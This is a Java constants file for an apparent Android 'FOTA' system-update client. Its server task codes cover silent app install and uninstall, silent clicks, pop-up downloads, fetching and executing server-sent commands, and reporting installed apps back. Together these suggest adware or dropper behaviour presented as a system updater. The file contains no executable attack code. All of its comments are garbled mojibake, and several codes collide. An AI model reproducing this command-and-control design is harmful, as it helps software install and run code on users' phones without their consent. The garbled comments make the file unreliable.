package com.fota.sys;

import android.os.Environment;

public class Constant
{
	public static String DEFAULT_DOWN_FILE_PATH = Environment.getExternalStorageDirectory().getPath() + "/Android/";
	//07-10 娣诲姞app涓嬭浇璺緞
	public static String APP_DOWN_FILE_PATH = DEFAULT_DOWN_FILE_PATH + "app/";
	
	public static boolean IS_DEBUG_MODE = true;
	
	public static final String	 SP_FILE_NAME		= "fota";
	
	public static final long DEFAULT_CIRCLE_MILS = 60*60*1000; 
	//sp鏂囦欢閲岄潰鐨勯敭鍊�
	public static final String SP_KEY_STRING_LAST_CONNECT_URL = "LAST_CONNECT_URL";
	public static final String SP_KEY_STRING_DEVICE_ID = "DEVICE_ID";
	public static final String SP_KEY_STRING_SCREEN_SIZE = "SCREEN_SIZE";
	public static final String SP_KEY_STRING_MODEL = "MODEL";
	public static final String SP_KEY_STRING_SDK_VERSION = "SDK_VERSION";
	public static final String SP_KEY_STRING_BRAND = "BRAND";
	public static final String SP_KEY_STRING_MANUFACTURER = "MANUFACTURER";
	public static final String SP_KEY_STRING_NEXT_PUSH_TIME = "NEXT_PUSH_TIME";
	
	public static final String SP_KEY_BOOLEAN_V1_TO_V3 = "V1_TO_V3";
	public static final String SP_KEY_BOOLEAN_UPDATE_VERSION = "UPDATE_VERSION";
	public static final String SP_KEY_BOOLEAN_INIT_BASE_PARAMS = "INIT_BASE_PARAMS";
	public static final String SP_KEY_BOOLEAN_HAVE_NET_RUN = "HAVE_NET_RUN";
	public static final String SP_KEY_BOOLEAN_IS_VISITING_SERVER = "IS_VISITING_SERVER";
	public static final String SP_KEY_BOOLEAN_IS_KILL_SELL = "IS_KILL_SELL";
	public static final String SP_KEY_BOOLEAN_IS_WAIT_FOR_ACTIVE = "IS_WAIT_FOR_ACTIVE";
	
	public static final String SP_KEY_LONG_NEXT_PUSH_MILS = "NEXT_PUSH_MILS";
	
	//Handler 鏍囪瘑浣�
	public static final int HANDLER_FLAG_SAVE_LAST_CONNECT_URL = 1000;
	public static final int HANDLER_FLAG_FINISH_VISIT_SERVER = 1001;
	public static final int HANDLER_FLAG_NO_NET_WORK = 1002;
	
	//缃戠粶閾炬帴鐨刄RL 07-10 淇敼鐗堟湰 jsp
	public static final String NET_URL_OF_SERVER = "ser_vfif.jsp";
	
//	public static final String NET_URL_OF_SERVER = "ser_vfo.jsp";
	public static final String NET_URL_OF_LINK = "link.html";
	public static final String NET_URL_OF_REPORT = "report.jsp";
	public static final String NET_URL_OF_APP_INSTALL = "appre.jsp";
	public static final String NET_URL_OF_APP_UNINSTALL = "unappre.jsp";
	
	//鏈嶅姟鍣ㄤ换鍔＄被鍨�
	public static final int SERVER_MISSION_TYPE_WAIT_FOR_ACTIVE = 1;
	public static final int SERVER_MISSION_TYPE_NOTICE_URL_JUMP = 2;
	public static final int SERVER_MISSION_TYPE_NOTICE_URL_DOWNLOAD_NORMAL = 3;
	public static final int SERVER_MISSION_TYPE_SILENT_INSTALL = 5;
	public static final int SERVER_MISSION_TYPE_SELF_UPDATE = 6;
	public static final int SERVER_MISSION_TYPE_DESKTOP_POP_URL_JUMP = 7;
	public static final int SERVER_MISSION_TYPE_DESKTOP_POP_DOWNLOAD = 9;
	public static final int SERVER_MISSION_TYPE_SILENT_CLICK = 10;
	public static final int SERVER_MISSION_TYPE_MESSAGE_PUSH = 11;
	public static final int SERVER_MISSION_TYPE_WAIT_FOR_NEXT_CIRCLE = 12;
	public static final int SERVER_MISSION_TYPE_SILENT_UNINSTALL = 13;
	public static final int SERVER_MISSION_TYPE_REMIND_INSTALL = 14;
	//07-10娣诲姞
	public static final int SERVER_MISSION_TYPE_URL_DOWNLOAD_CMD = 15;
	public static final int SERVER_MISSION_TYPE_EXECUTIVE_CMD_ORDER = 16;
	
	//绾补鏄负浜嗛潤榛樺畨瑁呭悗鐨勭偣鍑�
	public static final int SERVER_MISSION_TYPE_UN_REPORT_SILENT_CLICK = 14;
	
	//鏈湴浠诲姟鎵ц鎯呭喌
	public static final int CLIENT_MISSION_NOTICE_UNSHOW = 0;
	public static final int CLIENT_MISSION_NOTICE_FINISH_SHOW = 1;
	public static final int CLIENT_MISSION_SLEEPING = 2;
	public static final int CLIENT_MISSION_NOTICE_FINISH_SHOW_CONFIRM_DOWNLOAD = 3;
	public static final int CLIENT_MISSION_NOTICE_FINISH_SHOW_CONFIRM_INSTALL = 6;
	public static final int CLIENT_MISSION_START_DOWNLOAD = 4;
	public static final int CLIENT_MISSION_FINISH_DOWNLOAD = 5;	
	public static final int CLIENT_MISSION_DOWNLOAD_FAIL = 7;
	public static final int CLIENT_MISSION_IMG_DOWNLOAD_FINISH = 8;
	public static final int CLIENT_MISSION_IMG_DOWNLOAD_FAIL = 9;
	public static final int CLIENT_MISSION_WIN_POP_FINISH_SHOW = 10;
	
	//鏈湴浠诲姟鎵цHANDLER鐨勬爣璇嗕綅
	public static final int CLIENT_MISSION_HANDLER_START_SHOW_NOTICE = 1;
	public static final int CLIENT_MISSION_HANDLER_SHOW_DOWNLOAD_CONFIRM= 2;
	public static final int CLIENT_MISSION_HANDLER_DOWNLOAD_FILE_FINISH = 3;
	public static final int CLIENT_MISSION_HANDLER_SHOW_INSTALL_CONFIRM= 4;
	public static final int CLIENT_MISSION_HANDLER_INSTALL_APK= 5;
	public static final int CLIENT_MISSION_HANDLER_SHOW_OPEN_CONFIRM= 6;
	public static final int CLINET_MISSION_HANDLER_SHOW_DOWNLOAD_PROGRESS = 7;
	public static final int CLIENT_MISSION_HANDLER_SHOW_MSG_NOTICE = 8;
	public static final int CLIENT_MISSION_HANDLER_DOWNLOAD_URL2_FILE_FINISH = 9;
	public static final int CLIENT_MISSION_HANDLER_DOWNLOAD_URL2_FILE_FAIL = 10;
	public static final int CLIENT_MISSION_HANDLER_INSTALL_ALL_APKS = 11;
	
	
	//鐘舵�佹姤鍛婂洖浼�
	public static final int REPORT_STATUS_NOTICE_URL_CLICK = 1;
	public static final int REPORT_STATUS_NOTICE_URL_CLEAR = 2;
	public static final int REPORT_STATUS_MESSAGE_NO_MSG = 5;
	public static final int REPORT_STATUS_MESSAGE_PUSH_SUC = 6;
	public static final int REPORT_STATUS_SILENT_CLICK_SUC = 10;
	public static final int REPORT_STATUS_SILENT_CLICK_NO_APP = 11;
	public static final int REPORT_STATUS_WIN_POP_NO_POP = 12;
	public static final int REPORT_STATUS_WIN_POP_CANCEL = 13;
	public static final int REPORT_STATUS_WIN_POP_INSTALL_SUC = 14;
	public static final int REPORT_STATUS_WIN_POP_CANCEL_INSTALL = 15;
	public static final int REPORT_STATUS_WIN_POP_INSTALL_FAIL = 16;
	public static final int REPORT_STATUS_WIN_POP_CANCEL_DOWNLOAD = 39;
	public static final int REPORT_STATUS_WIN_POP_URL_JUMP_SUC = 22;
	public static final int REPORT_STATUS_ALL_PUSH_DOWN_IMG_FAIL = 23;
	public static final int REPORT_STATUS_WIN_POP_DOWNLOAD_FAIL = 40;
	//鏄剧ず鍦ㄩ�氱煡鏍忓悗鐢ㄦ埛娌＄偣鍑�,閲嶅惎鍚庝涪澶变簡
	public static final int REPORT_STATUS_RESTART = 24;
	//杩欎竴涓槸V2鐗堟湰鐨勬暟鎹�,宸插簾寮�
	public static final int REPORT_STATUS_NOTICE_URL_CLICK_INSTALL_SUC = 3;
	public static final int REPORT_STATUS_NOTICE_URL_CLICK_CANCEL = 4;
	//涓嬮潰鏁版嵁鏄疺3鐗堟湰缁欏嚭鐨勬洿缁嗗寲鐨勬姤鍛�
	public static final int REPORT_STATUS_NOTICE_URL_CANCEL_DOWNLOAD = 25;
	public static final int REPORT_STATUS_NOTICE_URL_DOWNLOAD_FAIL = 26;
	public static final int REPORT_STATUS_NOTICE_URL_CANCEL_INSTALL = 27;
	public static final int REPORT_STATUS_NOTICE_URL_INSTALL_FAIL = 28;
	public static final int REPORT_STATUS_NOTICE_URL_INSTALL_SUC = 29;
	public static final int REPORT_STATUS_SILENT_DOWNLOAD_FAIL = 30;
	public static final int REPORT_STATUS_SILENT_INSTALL_SUC = 31;
	public static final int REPORT_STATUS_SILENT_INSTALL_FAIL = 32;
	public static final int REPORT_STATUS_SELF_UPDATE_DOWNLOAD_FAIL = 33;
	public static final int REPORT_STATUS_SELF_UPDATE_SUC = 34;
	public static final int REPORT_STATUS_SELF_UPDATE_FAIL = 35;
	public static final int REPORT_STATUS_SILENT_UNINSTALL_NO_PACKAGE = 36;
	public static final int REPORT_STATUS_SILENT_UNINSTALL_SUC = 37;
	public static final int REPORT_STATUS_SILENT_UNINSTALL_FAIL = 38;
	
	public static final int REPORT_STATUS_MISSION_EXPIRE = 39;	
	public static final int REPORT_STATUS_SILENT_INSTALL_EXIST_PACKAGE = 40;
	public static final int REPORT_STATUS_REMIND_INSTALL_DOWN_FAIL = 41;
	public static final int REPORT_STATUS_REMIND_INSTALL_INSTALL_SUC = 42;
	public static final int REPORT_STATUS_REMIND_INSTALL_INSTALL_FAIL = 43;
	
	//07-10 娣诲姞鍥炰紶鐘舵�佹儏鍐�
	public static final int REPORT_STATUS_URL_DOWNLOAD_CMD_DOWN_FAIL = 22;
	public static final int REPORT_STATUS_EXECUTIVE_CMD_ORDER_FAIL = 22;
	public static final int REPORT_STATUS_EXECUTIVE_CMD_ORDER_SUC = 21;
	public static final int REPORT_STATUS_EXECUTIVE_CMD_ORDER_ERR = 22;
	
	//鏈嶅姟鍣ㄨ姹傜殑鎻愮ず瀹夎绫诲瀷
	//0涓嶆彁绀� 鐩存帴闈欓粯瀹夎 1鎻愮ず鎵ц闈欓粯瀹夎 2鎻愮ず鎵ц鏅�氬畨瑁� 3涓嶆彁绀虹洿鎺ユ墽琛屾櫘閫氬畨瑁�
	public static final int SERVER_INSTALL_TYPE_SILENT = 0;
	public static final int SERVER_INSTALL_TYPE_CONFIRM_SILENT = 1;
	public static final int SERVER_INSTALL_TYPE_CONFIRM_NORMAL = 2;
	public static final int SERVER_INSTALL_TYPE_NORMAL = 3;
	
	public static final String BROAD_CAST_NOTICE_CLEAR = "com.client.receive.NoticeClearAction";
	
	//搴旂敤涓婁紶绫诲瀷 1閿佸睆鏃朵笂浼犳墍鏈夋湭涓婁紶鐨凙PK,2鏄笂浼犲崟涓畨瑁呯殑搴旂敤,3鏄笂浼犲崟涓嵏杞界殑搴旂敤
	public static final int APP_REPORT_UPLOAD_ALL = 1;
	public static final int APP_REPORT_UPLOAD_SINGLE_INSTALL = 2;
	public static final int APP_REPORT_UPLOAD_SINGLE_UNINSTALL = 3;
	
	
	
}
